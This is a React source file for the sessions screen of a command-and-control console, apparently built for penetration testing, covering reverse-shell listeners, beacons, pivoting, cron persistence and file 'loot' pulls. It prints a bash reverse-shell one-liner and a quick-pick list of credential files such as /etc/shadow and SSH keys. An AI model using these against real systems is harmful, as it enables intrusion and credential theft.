// Sessions — terminal-first C2 workspace. Narrow session list (grouped by host)
// on the left, a large live terminal on the right, and one tidy action toolbar
// of grouped menus (Run · Transfer · Pivot · Persist · Upgrade · Loot) above it.
// Replaces the old cramped split-pane + wall of ~15 buttons.
import { useEffect, useRef, useState } from "react";
import {
  SessionInfo, ListenerInfo, QuickAction, getSessions, getListeners, startListener,
  stopListener, getQuickActions, runQuickAction, runEnum,
  downloadFromShell, uploadToShell, startTunnel, stopTunnel, tunnelStatus,
  startPortFwd, upgradeSession, lootCred, persistSession, getTeardown, TeardownInventory,
  removePersistence, removeAllPersistence, clearTeardownUpload, closeSession,
  TdPersistence, TdUpload, TdListener, TdSession, TdTunnel, TdPortfwd,
  getSessionTasks, TaskRow,
  Beacon, BeaconRegisterResponse, listBeacons, registerBeacon, deleteBeacon, patchBeacon,
  patchSession, pullLoot, selftestBeacon, runOrQueueTask, promoteBeacon,
} from "../api";
import { bytesToB64 } from "../util";
import { SectionProps } from "../nav";
import { Panel, Empty } from "../kit";
import { toast } from "../toast";
import { ShellTerminal } from "../sessions/Terminal";

export function Sessions({ nav }: SectionProps) {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [listeners, setListeners] = useState<ListenerInfo[]>([]);
  const [selId, setSelId] = useState<string | null>(null);
  const [teardown, setTeardown] = useState<TeardownInventory | null>(null);
  const [filter, setFilter] = useState("");     // batch-2: session list filter

  useEffect(() => {
    const poll = () => { getSessions().then(setSessions).catch(() => {}); getListeners().then(setListeners).catch(() => {}); };
    poll(); const t = window.setInterval(poll, 4000); return () => window.clearInterval(t);
  }, []);
  useEffect(() => { if (sessions.length && !sessions.find((s) => s.id === selId)) setSelId(sessions[0].id); }, [sessions, selId]);

  const sel = sessions.find((s) => s.id === selId) || null;
  // Filter: match host_ip / label / name / id — case-insensitive. Empty filter passes everything.
  const q = filter.trim().toLowerCase();
  const matches = (s: SessionInfo) => !q ||
    (s.host_ip || "").toLowerCase().includes(q) ||
    (s.label || "").toLowerCase().includes(q) ||
    (s.name || "").toLowerCase().includes(q) ||
    s.id.toLowerCase().includes(q);
  const visible = sessions.filter(matches);
  // Group by host, but keep the group ordering deterministic — pinned hosts (any
  // pinned session on that host) come first, then live > stale > dead, then IP.
  const byHost: Record<string, SessionInfo[]> = {};
  for (const s of visible) (byHost[s.host_ip] ||= []).push(s);
  const hostRank = (h: string) => {
    const ss = byHost[h];
    const pinned = ss.some((s) => s.pinned) ? 0 : 1;
    const status = ss.some((s) => s.status === "live") ? 0
                 : ss.some((s) => s.status === "stale") ? 1 : 2;
    return [pinned, status, h] as const;
  };
  const hostOrder = Object.keys(byHost).sort((a, b) => {
    const [pa, sa, ia] = hostRank(a); const [pb, sb, ib] = hostRank(b);
    return pa !== pb ? pa - pb : sa !== sb ? sa - sb : ia.localeCompare(ib);
  });
  // Within a host, pinned first, then by name for stability.
  for (const h of hostOrder) byHost[h].sort((a, b) =>
    Number(!!b.pinned) - Number(!!a.pinned) || (a.name || a.id).localeCompare(b.name || b.id));
  // Listener id → "host:port" for the small "via :4444" chip on each session card.
  const listenerAddr = new Map(listeners.map((l) => [l.id, `${l.port}`]));

  const togglePin = (s: SessionInfo) => {
    patchSession(s.id, { pinned: !s.pinned })
      .then(() => getSessions().then(setSessions))
      .catch((e) => toast.show(String(e)));
  };

  async function newListener() {
    try { const l = await startListener(4444, false); toast.show(`listener up on :${l.port}`); getListeners().then(setListeners); }
    catch { try { const l = await startListener(0, false); toast.show(`listener up on :${l.port}`); getListeners().then(setListeners); } catch (e) { toast.show(`listener failed: ${(e as Error).message}`); } }
  }

  return (
    <div className="sess-layout">
      {/* Left: listeners + session list */}
      <div className="sess-list">
        <Panel title="Listeners" actions={<button className="btn sm primary" onClick={newListener}>+ Start</button>}>
          {listeners.length === 0 ? <div className="muted" style={{ fontSize: 11 }}>No listeners. Start one, then point a reverse shell at your box.</div>
            : listeners.map((l) => (
              <div key={l.id} className="row" style={{ gap: 6, padding: "3px 0", fontSize: 12 }}>
                <span className={"sess-dot " + (l.status === "listening" ? "live" : "stale")} />
                <span className="mono">{l.host}:{l.port}</span><span className="faint">{l.kind}</span>
                <button className="linkish right" onClick={() => stopListener(l.id).then(() => getListeners().then(setListeners))}>stop</button>
              </div>
            ))}
          <details style={{ marginTop: 6 }}>
            <summary className="linkish" style={{ fontSize: 11 }}>catch a shell</summary>
            <pre className="out-panel" style={{ marginTop: 6 }}>{`bash -i >& /dev/tcp/<your-ip>/4444 0>&1`}</pre>
          </details>
        </Panel>

        <BeaconsPanel />

        <div>
          {sessions.length > 3 && (
            <input className="fin" style={{ margin: "6px 0", width: "100%", padding: "3px 6px", fontSize: 12 }}
                   placeholder="filter: host, label, name, id…" value={filter}
                   onChange={(e) => setFilter(e.target.value)} />
          )}
          {sessions.length === 0 ? <div className="muted" style={{ fontSize: 12, padding: "8px 2px" }}>No shells yet.</div>
           : hostOrder.length === 0 ? <div className="muted" style={{ fontSize: 12, padding: "8px 2px" }}>No matches for "{filter}".</div>
           : hostOrder.map((host) => (
              <div key={host}>
                <div className="sess-grp-h">{host}</div>
                {byHost[host].map((s) => {
                  // Prefer the operator's label over the auto-generated name — the label
                  // is "why this session matters" (e.g. "initial foothold"), the name
                  // is just a memorable id (STORMY_BEAR). Fall back to name, then hex.
                  const shown = s.label || s.name || s.id.slice(0, 8);
                  const secondary = s.label && s.name ? s.name : "";
                  return (
                  <div key={s.id} className={"sess-item" + (s.id === selId ? " active" : "")} onClick={() => setSelId(s.id)}>
                    <span className={"sess-dot " + s.status} />
                    {/* Pin star: click doesn't select the session — stopPropagation
                        so the row's onClick doesn't fire. */}
                    <button className="linkish" title={s.pinned ? "unpin" : "pin"}
                            onClick={(e) => { e.stopPropagation(); togglePin(s); }}
                            style={{ fontSize: 12, padding: 0, marginRight: 2,
                                     color: s.pinned ? "var(--accent, #f59e0b)" : "var(--faint, #999)" }}>
                      {s.pinned ? "★" : "☆"}
                    </button>
                    <span className="sess-name" title={secondary ? `${shown} · ${secondary}` : shown}>{shown}</span>
                    {s.kind === "beacon" && <span className="chip" title="async beacon (polls in via /beacon/checkin)" style={{ fontSize: 9 }}>BEACON</span>}
                    {s.pty && <span className="chip" style={{ fontSize: 9 }}>PTY</span>}
                    {s.socks_port ? <span className="chip" title="SOCKS proxy up" style={{ fontSize: 9 }}>SOCKS</span> : null}
                    {s.listener_id && listenerAddr.has(s.listener_id) && (
                      <span className="faint" title={`caught by listener ${s.listener_id}`}
                            style={{ fontSize: 10, marginLeft: 4 }}>via :{listenerAddr.get(s.listener_id)}</span>
                    )}
                    {s.notes && <span title={s.notes} style={{ fontSize: 10, opacity: 0.6 }}>📝</span>}
                  </div>
                );})}
              </div>
            ))}
        </div>
      </div>

      {/* Right: terminal workspace */}
      <div className="sess-work">
        {!sel ? (
          <Panel><Empty>No session selected. Start a listener and catch a reverse shell — it'll appear here.</Empty></Panel>
        ) : (
          <>
            <div className="sess-toolbar">
              <InfoMenu session={sel} onChanged={() => getSessions().then(setSessions)} />
              <RunMenu session={sel} />
              <TransferMenu session={sel} />
              <PivotMenu session={sel} />
              <PersistMenu session={sel} onTeardown={() => getTeardown().then(setTeardown)} />
              {sel.kind === "beacon" ? (
                <button className="btn sm"
                        title="queue the upgrade stager — on next check-in the beacon will connect back as an interactive PTY shell"
                        onClick={() => promoteBeacon(sel.id)
                          .then((r) => toast.show(r.message || "promote queued"))
                          .catch((e) => toast.show(String(e)))}>⬆ Promote → Shell</button>
              ) : (
                <button className="btn sm" disabled={sel.pty}
                        title={sel.pty ? "this session is already running a PTY"
                                      : "upgrade to a robust reconnecting PTY"}
                        onClick={() => upgradeSession(sel.id).then((r) => toast.show(r.upgraded ? "PTY upgrade sent — reconnecting shell will land as a sibling" : (r.reason || "upgrade requested"))).catch((e) => toast.show(String(e)))}>⬆ Upgrade PTY</button>
              )}
              <LootMenu session={sel} />
              <button className="btn sm right" onClick={() => getTeardown().then(setTeardown)}>Teardown</button>
            </div>
            <div className="term-wrap"><ShellTerminal session={sel} tester={nav.tester} /></div>
            <TasksPanel session={sel} />
          </>
        )}
      </div>

      {teardown && <TeardownDrawer inv={teardown} onClose={() => setTeardown(null)} />}
    </div>
  );
}

// ---- Tasks panel (async-C2 P0 — read-only) ---------------------------------
// The task-record layer on the /task endpoint writes one row per dispatched
// command (queued -> done). This panel is the team-visible view of those rows
// for the selected session: signal-first grouped counts up top, most-recent
// list below, collapsed by default so it never fights the terminal for space.
// Polls every 4s; live SSE swap-in lands with the beacon transport in P1.
function TasksPanel({ session }: { session: SessionInfo }) {
  const [rows, setRows] = useState<TaskRow[]>([]);
  const [open, setOpen] = useState(false);
  const [selected, setSelected] = useState<TaskRow | null>(null);

  useEffect(() => {
    let cancel = false;
    const poll = () => {
      getSessionTasks(session.id, { limit: 50 })
        .then((r) => { if (!cancel) setRows(r.tasks || []); })
        .catch(() => {});
    };
    poll();
    const t = window.setInterval(poll, 4000);
    return () => { cancel = true; window.clearInterval(t); };
  }, [session.id]);

  // Signal-first counters — the whole point of a summary bar per
  // webui-ux-preferences (not a flat list).
  const counts = { queued: 0, done: 0, error: 0, other: 0 };
  for (const r of rows) {
    if (r.status === "queued" || r.status === "sent") counts.queued++;
    else if (r.status === "done" || r.status === "ok") counts.done++;
    else if (r.status === "error") counts.error++;
    else counts.other++;
  }

  return (
    <div className="tasks-panel" style={{ borderTop: "1px solid var(--line)",
                                          background: "var(--surface, transparent)" }}>
      <div className="row" style={{ gap: 10, padding: "6px 10px", alignItems: "center",
                                    cursor: "pointer", fontSize: 12 }}
           onClick={() => setOpen((v) => !v)}
           title="task-record: every command dispatched through this session">
        <span style={{ fontWeight: 600 }}>Tasks</span>
        <span className="chip" title="completed">{counts.done} done</span>
        {counts.queued > 0 && <span className="chip" style={{ color: "var(--warn)" }} title="in flight">{counts.queued} queued</span>}
        {counts.error > 0 && <span className="chip" style={{ color: "var(--err, #b00)" }} title="failed">{counts.error} error</span>}
        <span className="faint right" style={{ fontSize: 11 }}>{open ? "▾" : "▸"} {rows.length ? `${rows.length} total` : "none yet"}</span>
      </div>
      {open && (
        <div style={{ maxHeight: 240, overflowY: "auto", padding: "4px 10px 10px" }}>
          {rows.length === 0 ? (
            <div className="muted" style={{ fontSize: 12, padding: "8px 0" }}>
              No tasks yet. Use Run → Command, or fieldkit against this session, and rows will appear here.
            </div>
          ) : rows.map((r) => {
            // Loot-pull tasks: the raw `base64 /etc/shadow` command is
            // implementation detail — surface the intent ("📥 pull /etc/shadow")
            // so the panel reads as loot activity, not shell activity.
            const isLoot = r.kind === "loot-pull";
            const lootPath = isLoot ? extractLootPath(r.command) : "";
            const displayCmd = isLoot && lootPath
              ? `📥 pull ${lootPath}${r.status === "error" && r.output ? ` — ${r.output}` : ""}`
              : r.command;
            return (
            <div key={r.task_id || (r.ts + r.command)}
                 className="row" style={{ gap: 8, padding: "3px 0", fontSize: 12, alignItems: "baseline",
                                          borderBottom: "1px solid color-mix(in srgb,var(--line) 40%,transparent)",
                                          cursor: r.output ? "pointer" : "default" }}
                 onClick={() => r.output && setSelected(r)}
                 title={r.output ? "click to view captured output" : ""}>
              <span className="chip" style={{ fontSize: 10,
                                              color: r.status === "error" ? "var(--err, #b00)"
                                                   : r.status === "queued" || r.status === "sent" ? "var(--warn)"
                                                   : undefined }}>
                {r.status}
              </span>
              <span className="mono" style={{ flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                {displayCmd}
              </span>
              {r.attack && <span className="faint" style={{ fontSize: 10 }} title={r.attack}>{r.attack.split(" ")[0]}</span>}
              {r.bytes > 0 && <span className="faint" style={{ fontSize: 10 }}>{r.bytes}B</span>}
              <span className="faint" style={{ fontSize: 10 }}>{r.operator}</span>
            </div>
            );
          })}
        </div>
      )}
      {selected && (
        <TaskDetailDrawer task={selected} onClose={() => setSelected(null)} />
      )}
    </div>
  );
}

function extractLootPath(cmd: string): string {
  let inner = cmd;
  if (cmd.startsWith('sh -c "')) {
    inner = cmd.slice('sh -c "'.length).replace(/"$/, "");
  }
  if (!inner.startsWith("base64 ")) return "";
  const tail = inner.slice("base64 ".length);
  const idx = tail.indexOf(" 2>/dev/null");
  const pathPart = idx >= 0 ? tail.slice(0, idx) : tail;
  return pathPart.trim().replace(/^'|'$/g, "");
}

// Fallback decoder for when the artifact fetch fails / hasn't landed yet.
// Reads the base64 preview stored on the task row (capped at ~4 KiB, so
// files larger than ~2.6 KB raw will fail to decode — we report that).
function fromRowPreview(output: string): { loading: false; text: string; bytes: number;
    binary: boolean; savedPath: string; error: string } {
  if (!output) return { loading: false, text: "", bytes: 0, binary: false, savedPath: "", error: "" };
  const cleaned = output.replace(/[\s\r\n]/g, "");
  try {
    const bin = atob(cleaned);
    let binary = false;
    for (let i = 0; i < bin.length; i++) {
      const c = bin.charCodeAt(i);
      if (c === 0 || (c < 0x20 && c !== 0x09 && c !== 0x0a && c !== 0x0d) || c >= 0xf5) {
        binary = true; break;
      }
    }
    if (binary) return { loading: false, text: "", bytes: bin.length, binary: true, savedPath: "", error: "" };
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const text = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
    return { loading: false, text, bytes: bin.length, binary: false, savedPath: "", error: "" };
  } catch {
    return { loading: false, text: "", bytes: 0, binary: false, savedPath: "",
             error: "the row preview is truncated (files > ~2.6 KB); the artifact fetch is the reliable path" };
  }
}

// TaskDetailDrawer — for loot-pull tasks the raw `output` is base64 text of
// the pulled file, which is unreadable to a human. This drawer:
//   • Prefers fetching the ACTUAL saved artifact via /api/loot/file — works
//     for arbitrarily large files (the DB preview truncates at 4000 chars of
//     base64, ~2.6 KB raw, so anything bigger fails to decode from the row).
//   • Falls back to base64-decoding the truncated preview when no artifact
//     row exists yet (task just completed, artifact index still catching up).
//   • Offers a "Raw base64" toggle for anyone debugging the transport.
function TaskDetailDrawer({ task, onClose }: { task: TaskRow; onClose: () => void }) {
  const isLoot = task.kind === "loot-pull";
  const [mode, setMode] = useState<"decoded" | "raw">(isLoot ? "decoded" : "raw");
  const lootPath = isLoot ? extractLootPath(task.command) : "";

  // Async: locate the artifact for this task and pull the real file bytes.
  const [fileInfo, setFileInfo] = useState<{
    loading: boolean; text: string; bytes: number; binary: boolean;
    savedPath: string; error: string;
  }>({ loading: isLoot, text: "", bytes: 0, binary: false, savedPath: "", error: "" });
  useEffect(() => {
    if (!isLoot) return;
    let cancel = false;
    (async () => {
      try {
        const arts = await fetch(`/api/artifacts?task=${encodeURIComponent(task.task_id)}&limit=5`)
          .then((r) => r.ok ? r.json() : { artifacts: [] });
        const art = (arts.artifacts || [])[0];
        if (!art) {
          // Fall back to the row preview (base64 decode with truncation guard).
          if (cancel) return;
          setFileInfo(fromRowPreview(task.output));
          return;
        }
        const rel = art.path.split("/session-loot/").pop() || "";
        const resp = await fetch(`/api/loot/file?rel=${encodeURIComponent(rel)}`);
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        const buf = new Uint8Array(await resp.arrayBuffer());
        if (cancel) return;
        // Same binary sniff as before — any NUL or unexpected control char
        // outside \t\r\n means we can't safely render as text.
        let binary = false;
        for (let i = 0; i < buf.length; i++) {
          const c = buf[i];
          if (c === 0 || (c < 0x20 && c !== 0x09 && c !== 0x0a && c !== 0x0d) || c >= 0xf5) {
            binary = true; break;
          }
        }
        const text = binary ? "" : new TextDecoder("utf-8", { fatal: false }).decode(buf);
        setFileInfo({ loading: false, text, bytes: buf.length, binary,
                      savedPath: rel, error: "" });
      } catch (e) {
        if (cancel) return;
        setFileInfo({ ...fromRowPreview(task.output),
                      error: `fetch failed (${String(e)}) — showing row preview if any` });
      }
    })();
    return () => { cancel = true; };
  }, [task.task_id, isLoot, task.output]);

  const displayCmd = isLoot && lootPath ? `📥 pull ${lootPath}` : task.command;

  return (
    <div className="drawer-backdrop" onClick={onClose}>
      <div onClick={(e) => e.stopPropagation()}
           style={{ position: "fixed", inset: "10% 10%", background: "var(--bg)",
                    border: "1px solid var(--line)", borderRadius: 6, padding: 14,
                    display: "flex", flexDirection: "column", zIndex: 1000 }}>
        <div className="row" style={{ gap: 8, alignItems: "baseline", marginBottom: 8 }}>
          <span className="chip">{task.status}</span>
          <span className="mono" style={{ fontWeight: 600 }}>{displayCmd}</span>
          {task.attack && <span className="chip">{task.attack}</span>}
          {isLoot && (
            <span className="row" style={{ gap: 4, marginLeft: 8 }}>
              <button className={"btn sm" + (mode === "decoded" ? " primary" : "")}
                      onClick={() => setMode("decoded")}
                      title="the file's actual contents (base64 decoded)">Decoded</button>
              <button className={"btn sm" + (mode === "raw" ? " primary" : "")}
                      onClick={() => setMode("raw")}
                      title="the raw base64 as returned by the target — how it was transported over the shell channel">Raw base64</button>
            </span>
          )}
          <button className="btn sm right" onClick={onClose}>Close</button>
        </div>
        <pre className="out-panel" style={{ flex: 1, overflow: "auto", margin: 0 }}>
          {isLoot && mode === "decoded"
            ? (task.status === "error"
               ? `(failed: ${task.output || "unknown error"})`
               : fileInfo.loading ? "(loading actual file from session-loot…)"
               : fileInfo.text ? fileInfo.text
               : fileInfo.binary ? `(binary file — ${fileInfo.bytes} bytes — saved to session-loot/${fileInfo.savedPath}, not rendered)`
               : fileInfo.error ? `(${fileInfo.error})`
               : "(no output)")
            : (task.output || "(no output)")}
        </pre>
        <div className="faint" style={{ fontSize: 11, marginTop: 6 }}>
          {task.bytes}B · {task.operator} · {task.result_at ? `finished ${new Date(Number(task.result_at) * 1000).toLocaleTimeString()}` : "still queued"}
          {isLoot && fileInfo.savedPath && <> · <a href={`/api/loot/file?rel=${encodeURIComponent(fileInfo.savedPath)}`} target="_blank" rel="noreferrer" className="linkish">download from session-loot/</a></>}
        </div>
      </div>
    </div>
  );
}

// --- popover menu -----------------------------------------------------------
function Menu({ label, children }: { label: string; children: React.ReactNode }) {
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!open) return;
    const h = (e: MouseEvent) => { if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false); };
    document.addEventListener("mousedown", h); return () => document.removeEventListener("mousedown", h);
  }, [open]);
  return (
    <div className="pop" ref={ref}>
      <button className="btn sm" onClick={() => setOpen((v) => !v)}>{label} ▾</button>
      {open && <div className="pop-panel">{children}</div>}
    </div>
  );
}

// InfoMenu — batch-2 ergonomics. Rename the session (label), add operator
// notes (for the writeup), and toggle pinned. All persisted via PATCH so a
// serve restart doesn't lose the tester's context. Kept as a compact menu so
// it doesn't grow the toolbar's height.
function InfoMenu({ session, onChanged }: { session: SessionInfo; onChanged: () => void }) {
  const [label, setLabel] = useState(session.label || "");
  const [notes, setNotes] = useState(session.notes || "");
  // Re-seed the local editors when the selected session changes, or when the
  // upstream row changes (e.g. someone else on the team edited the label).
  useEffect(() => { setLabel(session.label || ""); setNotes(session.notes || ""); },
            [session.id, session.label, session.notes]);
  const save = (patch: { label?: string; notes?: string; pinned?: boolean }) => {
    patchSession(session.id, patch)
      .then(() => { toast.show("session updated"); onChanged(); })
      .catch((e) => toast.show(String(e)));
  };
  const dirty = label !== (session.label || "") || notes !== (session.notes || "");
  return (
    <Menu label="Info">
      <div className="field"><span className="fl">Label — a short, memorable name</span>
        <input className="fin" placeholder="e.g. web01 initial foothold"
               value={label} onChange={(e) => setLabel(e.target.value)}
               maxLength={80} style={{ marginBottom: 6 }} />
      </div>
      <div className="field"><span className="fl">Notes — how you got in, what's interesting</span>
        <textarea className="fin" rows={4} placeholder="folded into the report writeup"
                  value={notes} onChange={(e) => setNotes(e.target.value)}
                  maxLength={4096} style={{ marginBottom: 6, resize: "vertical" }} />
      </div>
      <div className="row" style={{ gap: 6, alignItems: "center" }}>
        <button className="btn sm primary" disabled={!dirty}
                onClick={() => save({ label: label.trim(), notes })}>Save</button>
        <button className="btn sm" onClick={() => save({ pinned: !session.pinned })}
                title={session.pinned ? "unpin from top of list" : "pin to top of list"}>
          {session.pinned ? "★ Unpin" : "☆ Pin"}
        </button>
        <span className="faint" style={{ fontSize: 10, marginLeft: 6 }}>
          {session.host_ip}
          {session.listener_id && ` · via listener ${session.listener_id.slice(0, 6)}`}
        </span>
      </div>
    </Menu>
  );
}

function RunMenu({ session }: { session: SessionInfo }) {
  const [qa, setQa] = useState<QuickAction[]>([]);
  const [cmd, setCmd] = useState("");
  const [out, setOut] = useState("");
  const [busy, setBusy] = useState(false);
  useEffect(() => { getQuickActions().then(setQa).catch(() => {}); }, []);
  const isBeacon = session.kind === "beacon";

  // Route through /task instead of /quickrun so BOTH beacons and interactive
  // shells work: interactive returns the output synchronously; beacon queues,
  // and the check-in delivers + result-post backfills the row in the Tasks
  // panel. Previously the free command input 409'd on beacons ("shell not
  // connected") because /quickrun required a live socket.
  const runAny = async (command: string) => {
    if (!command.trim()) return;
    setBusy(true);
    try {
      const r = await runOrQueueTask(session.id, command);
      if (r.queued) {
        setOut(`[queued] ${command}\ntask_id=${r.task_id.slice(0, 8)} · result will land in the Tasks panel when the beacon next checks in (see the sleep interval)`);
      } else {
        setOut(r.output || "(no output)");
      }
    } catch (e) {
      setOut(`error: ${String(e)}`);
    } finally { setBusy(false); }
  };

  return (
    <Menu label="Run">
      {isBeacon && (
        <div className="faint" style={{ fontSize: 11, marginBottom: 6 }}>
          ⏱ Beacon session — commands are <b>queued</b> and run on the next check-in.
          Watch the Tasks panel below for the result.
        </div>
      )}
      <div className="row wrap" style={{ gap: 4, marginBottom: 8 }}>
        {qa.map((a) => (
          // Quick-action chips: for interactive shells, /quick runs the
          // curated command synchronously and returns output. For beacons,
          // the same command has to go through the queue path, so we send
          // it as a raw task instead of hitting /quick.
          <button key={a.key} className="btn sm" disabled={busy} title={a.cmd}
                  onClick={() => isBeacon
                    ? runAny(a.cmd)
                    : (async () => { setBusy(true); try { setOut((await runQuickAction(session.id, a.key)).output); } catch (e) { setOut(String(e)); } finally { setBusy(false); } })()}>
            {a.label}
          </button>
        ))}
      </div>
      <div className="row" style={{ gap: 6, marginBottom: 8 }}>
        <input className="fin" placeholder={isBeacon ? "queue a command… (runs on next check-in)" : "run a command…"}
               value={cmd} onChange={(e) => setCmd(e.target.value)}
               onKeyDown={(e) => { if (e.key === "Enter" && cmd.trim()) runAny(cmd); }} />
        <button className="btn sm" disabled={busy || !cmd.trim()} onClick={() => runAny(cmd)}>
          {isBeacon ? "Queue" : "Run"}
        </button>
      </div>
      <button className="btn sm" disabled={busy || isBeacon}
              title={isBeacon
                ? "the enum script needs an interactive shell to stream output; not supported on beacons"
                : "runs recce-enum.sh/.ps1 on the target and folds the output into Priv-Esc"}
              onClick={() => { setBusy(true); runEnum(session.id).then((r) => { setOut(`enum queued (${r.bytes} bytes script)`); }).catch((e) => setOut(String(e))).finally(() => setBusy(false)); }}>
        Run on-target enum → ingest
      </button>
      {out && <pre className="out-panel" style={{ marginTop: 8 }}>{out}</pre>}
    </Menu>
  );
}

function TransferMenu({ session }: { session: SessionInfo }) {
  const [path, setPath] = useState("");
  const [upPath, setUpPath] = useState("");
  const fileRef = useRef<HTMLInputElement>(null);
  return (
    <Menu label="Transfer">
      <div className="field"><span className="fl">Download from target</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" placeholder="/etc/passwd" value={path} onChange={(e) => setPath(e.target.value)} />
          <button className="btn sm" disabled={!path.trim()} onClick={() => downloadFromShell(session.id, path).then((r) => toast.show(`saved ${r.saved} (${r.size} B)`)).catch((e) => toast.show(String(e)))}>Get</button>
        </div>
      </div>
      <div className="field"><span className="fl">Upload to target</span>
        <input className="fin" placeholder="remote path e.g. /tmp/x" value={upPath} onChange={(e) => setUpPath(e.target.value)} />
        <input ref={fileRef} type="file" style={{ marginTop: 6, fontSize: 11 }}
               onChange={async (e) => {
                 const f = e.target.files?.[0]; if (!f || !upPath.trim()) { toast.show("set a remote path first"); return; }
                 const b64 = bytesToB64(new Uint8Array(await f.arrayBuffer()));
                 uploadToShell(session.id, upPath, b64).then((r) => toast.show(`uploaded ${r.bytes} B`)).catch((er) => toast.show(String(er)));
               }} />
      </div>
    </Menu>
  );
}

function PivotMenu({ session }: { session: SessionInfo }) {
  const [socks, setSocks] = useState(1080);
  const [lport, setLp] = useState(0); const [rhost, setRh] = useState(""); const [rport, setRp] = useState(0);
  return (
    <Menu label="Pivot">
      <div className="field"><span className="fl">SOCKS5 tunnel</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" type="number" value={socks} onChange={(e) => setSocks(+e.target.value)} style={{ width: 90 }} />
          <button className="btn sm" onClick={() => startTunnel(session.id, socks).then((r) => toast.show(r.ok ? `SOCKS up on ${r.socks_addr}` : (r.reason || "failed"))).catch((e) => toast.show(String(e)))}>Start</button>
          <button className="btn sm" onClick={() => stopTunnel(session.id).then(() => toast.show("tunnel stopped"))}>Stop</button>
          <button className="btn sm" onClick={() => tunnelStatus(session.id).then((s) => toast.show(s.active ? `SOCKS :${s.socks_port}` : "no tunnel"))}>Status</button>
        </div>
      </div>
      <div className="field"><span className="fl">Port-forward (local → target-internal)</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" type="number" placeholder="lport" value={lport || ""} onChange={(e) => setLp(+e.target.value)} style={{ width: 70 }} />
          <input className="fin" placeholder="rhost" value={rhost} onChange={(e) => setRh(e.target.value)} />
          <input className="fin" type="number" placeholder="rport" value={rport || ""} onChange={(e) => setRp(+e.target.value)} style={{ width: 70 }} />
          <button className="btn sm" disabled={!lport || !rhost || !rport} onClick={() => startPortFwd(session.id, lport, rhost, rport).then((r) => toast.show(r.ok ? `forwarding :${lport} → ${rhost}:${rport}` : (r.reason || "failed"))).catch((e) => toast.show(String(e)))}>Add</button>
        </div>
      </div>
    </Menu>
  );
}

function PersistMenu({ session, onTeardown }: { session: SessionInfo; onTeardown: () => void }) {
  const [armed, setArmed] = useState(false);
  const install = () => {
    // Belt-and-suspenders on an intrusive, on-target action: even after the
    // in-menu "armed" step the operator gets a native confirm naming the host
    // — the same pattern retire uses. Prevents a single stray click on an armed
    // Persist menu from writing crontab on the wrong box.
    if (!confirm(`Install a tracked cron beacon on ${session.host_ip}?\n\n`
                 + `This is INTRUSIVE (writes a crontab entry on the target). `
                 + `The install is tracked in Teardown so it can be removed cleanly.`)) {
      setArmed(false);
      return;
    }
    persistSession(session.id)
      .then((r) => toast.show(r.ok ? "beacon installed (tracked in Teardown)" : (r.reason || "failed")))
      .catch((e) => toast.show(String(e)))
      .finally(() => setArmed(false));
  };
  return (
    <Menu label="Persist">
      <div className="muted" style={{ fontSize: 11, marginBottom: 8 }}>Installs a tracked cron beacon (INTRUSIVE). Removable from Teardown.</div>
      {!armed
        ? <button className="btn sm danger" onClick={() => setArmed(true)}>Install beacon</button>
        : <span className="row" style={{ gap: 6, alignItems: "center" }}>
            <span style={{ fontSize: 11, color: "var(--warn)", fontWeight: 600 }}>intrusive — are you sure?</span>
            <button className="btn sm danger" onClick={install}>Yes, install</button>
            <button className="btn sm" onClick={() => setArmed(false)}>Cancel</button>
          </span>}
      <button className="btn sm" style={{ marginLeft: 6 }} onClick={onTeardown}>Open Teardown</button>
    </Menu>
  );
}

// Quick-pick targets — common host-recon paths a tester grabs after landing
// a shell. Kept short and OS-obvious so it's a visible shortcut, not a
// checklist. Anything not here goes through the free-form path input.
const LOOT_QUICKPICKS_LINUX: { label: string; path: string }[] = [
  { label: "/etc/passwd", path: "/etc/passwd" },
  { label: "/etc/shadow", path: "/etc/shadow" },
  { label: "~/.ssh/id_rsa", path: "~/.ssh/id_rsa" },
  { label: "~/.bash_history", path: "~/.bash_history" },
  { label: "/root/.bash_history", path: "/root/.bash_history" },
  { label: "/etc/hosts", path: "/etc/hosts" },
];

function LootMenu({ session }: { session: SessionInfo }) {
  const [u, setU] = useState(""); const [s, setS] = useState(""); const [k, setK] = useState("password");
  const [path, setPath] = useState("");
  const [pulling, setPulling] = useState(false);
  const isBeacon = session.kind === "beacon";
  const pull = (p: string) => {
    const target = (p || path).trim();
    if (!target) { toast.show("path required"); return; }
    setPulling(true);
    // pullLoot dispatches internally: interactive shell → runs now, returns
    // {saved, size}; beacon → queues a `base64 <path>` loot-pull task, returns
    // {status:queued, task_id}. The result handler at /beacon/result decodes
    // + saves when the beacon posts back on its next check-in.
    pullLoot(session.id, target)
      .then((r) => {
        if ("status" in r && r.status === "queued") {
          toast.show(`queued for ${r.host_ip} — saves on next beacon check-in`);
        } else if ("saved" in r) {
          toast.show(`pulled ${r.size} bytes → ${r.saved}`);
        }
        setPath("");
      })
      .catch((e) => toast.show(`pull failed: ${String(e)}`))
      .finally(() => setPulling(false));
  };
  return (
    <Menu label="Loot">
      {/* Pull-a-file: same backend as Transfer → Download for interactive
          shells; on beacons it queues a loot-pull task and the /beacon/result
          handler auto-decodes + saves when the beacon checks in next. */}
      <div className="field"><span className="fl">
        Grab a file → loot{isBeacon && <span className="faint" style={{ fontWeight: "normal" }}> · queued until next check-in</span>}
      </span>
        <div className="row" style={{ gap: 6, marginBottom: 6 }}>
          <input className="fin" placeholder="e.g. /etc/shadow or C:\\Users\\Admin\\NTUSER.DAT"
                 value={path} onChange={(e) => setPath(e.target.value)}
                 style={{ flex: 1 }} />
          <button className="btn sm primary" disabled={!path.trim() || pulling}
                  onClick={() => pull(path)}>{pulling ? "…" : isBeacon ? "Queue" : "Pull"}</button>
        </div>
        <div className="row wrap" style={{ gap: 4 }}>
          {LOOT_QUICKPICKS_LINUX.map((q) => (
            <button key={q.path} className="btn sm" disabled={pulling} title={q.path}
                    style={{ fontSize: 10, padding: "1px 6px" }}
                    onClick={() => pull(q.path)}>{q.label}</button>
          ))}
        </div>
